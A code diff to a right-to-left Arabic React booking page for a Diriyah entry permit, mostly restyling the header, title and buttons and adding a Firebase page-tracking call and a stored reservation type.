@@ -3,11 +3,16 @@ import { Button } from "@/components/ui/button";
 import { Label } from "@/components/ui/label";
 import { Input } from "@/components/ui/input";
 import { Link } from "wouter";
-import { useState } from "react";
+import { useState, useEffect } from "react";
+import { handleCurrentPage } from "@/lib/firebase";
 
 export default function BookingPage() {
   const [date, setDate] = useState<Date | undefined>(new Date());
   const [time, setTime] = useState("09:00");
+  
+  useEffect(() => {
+    handleCurrentPage("booking");
+  }, []);
 
   return (
     <div className="min-h-screen bg-gradient-to-b from-background to-[#f5f0e8] flex flex-col" dir="rtl">
@@ -24,8 +29,8 @@ export default function BookingPage() {
 
 function Header() {
   return (
-    <header className="bg-gradient-to-r from-[#3d3428] to-[#5c4a3d] text-white">
-      <div className="container mx-auto px-4 py-4">
+    <header className="sticky top-0 z-50 bg-gradient-to-r from-[#2a1f16] via-[#3d3428] to-[#2a1f16] text-white shadow-xl">
+      <div className="container mx-auto px-4 py-3">
         <div className="flex items-center justify-between">
           <Link href="/registration">
             <Button size="icon" variant="ghost" className="text-white hover:bg-white/10" data-testid="button-back-booking">
@@ -34,7 +39,7 @@ function Header() {
           </Link>
           
           <div className="flex-1 flex justify-center">
-            <img src="/logo-white.svg" alt="الدرعية" className="h-12" data-testid="img-booking-logo" />
+            <img src="/logo-white.svg" alt="الدرعية" className="h-10" data-testid="img-booking-logo" />
           </div>
           
           <div className="w-10" />
@@ -77,14 +82,14 @@ function Header() {
 
 function TitleSection() {
   return (
-    <div className="bg-gradient-to-r from-[#e8d5b5] to-[#d4c4a8] py-8 px-4 text-center">
+    <div className="bg-gradient-to-r from-[#c4956a] to-[#d4a574] py-6 px-4 text-center">
       <div className="flex items-center justify-center gap-3 mb-2">
-        <Ticket className="w-7 h-7 text-primary" />
-        <h1 className="text-2xl font-bold text-foreground" data-testid="text-booking-title">
+        <Ticket className="w-7 h-7 text-white" />
+        <h1 className="text-2xl font-bold text-white" data-testid="text-booking-title">
           تصريح دخول الدرعية
         </h1>
       </div>
-      <p className="text-muted-foreground text-sm">اختر التاريخ والوقت المناسب لزيارتك</p>
+      <p className="text-white/80 text-sm">اختر التاريخ والوقت المناسب لزيارتك</p>
     </div>
   );
 }
@@ -108,7 +113,7 @@ function BookingForm({
 
   return (
     <section className="px-4 py-8" data-testid="section-booking-form">
-      <div className="max-w-md mx-auto bg-white rounded-2xl shadow-xl p-6 space-y-6 animate-fade-in">
+      <div className="max-w-md mx-auto bg-white rounded-2xl shadow-xl p-6 space-y-6 animate-fade-in border border-border/20">
         <h2 className="text-center text-xl font-bold text-foreground">
           الرجاء الاختيار
         </h2>
@@ -174,9 +179,10 @@ function BookingForm({
           <Link href="/cart">
             <Button 
               size="lg"
-              className="w-full bg-primary text-white shadow-lg"
+              className="w-full bg-primary text-white shadow-lg h-14 text-base"
               onClick={() => {
                 localStorage.setItem("bookingData", JSON.stringify({ date, time }));
+                localStorage.setItem("reservationType", "ticket");
               }}
               data-testid="button-confirm-booking"
             >
@@ -188,7 +194,7 @@ function BookingForm({
             <Button 
               variant="outline"
               size="lg"
-              className="w-full"
+              className="w-full h-12"
               data-testid="button-cancel-booking"
             >
               إلغاء
